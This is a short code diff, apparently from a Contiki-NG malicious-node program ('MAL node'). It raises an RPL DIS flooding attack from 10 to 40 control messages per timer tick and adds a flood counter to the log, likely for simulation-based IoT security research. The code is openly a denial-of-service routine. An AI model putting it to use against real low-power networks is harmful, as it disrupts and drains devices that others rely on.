@@ -28,6 +28,9 @@ static void rpl_attack();
 PROCESS(udp_client_process, "MAL node");
 AUTOSTART_PROCESSES(&udp_client_process);
 /*---------------------------------------------------------------------------*/
+
+  uint16_t numbers=0;
+
 static void
 udp_rx_callback(struct simple_udp_connection *c,
          const uip_ipaddr_t *sender_addr,
@@ -54,11 +57,12 @@ static void rpl_attack(void *ptr){
   //   ctimer_reset(&attack_time);
   //   return;
   // }
-      ctimer_reset(&attack_time);
+    LOG_INFO("Flood att:%d",numbers++);
+   ctimer_reset(&attack_time);
 
   int i=0;
       //My code
-      while (i<10){
+      while (i<40){
         i++;
         rpl_icmp6_dis_output(NULL);
       }
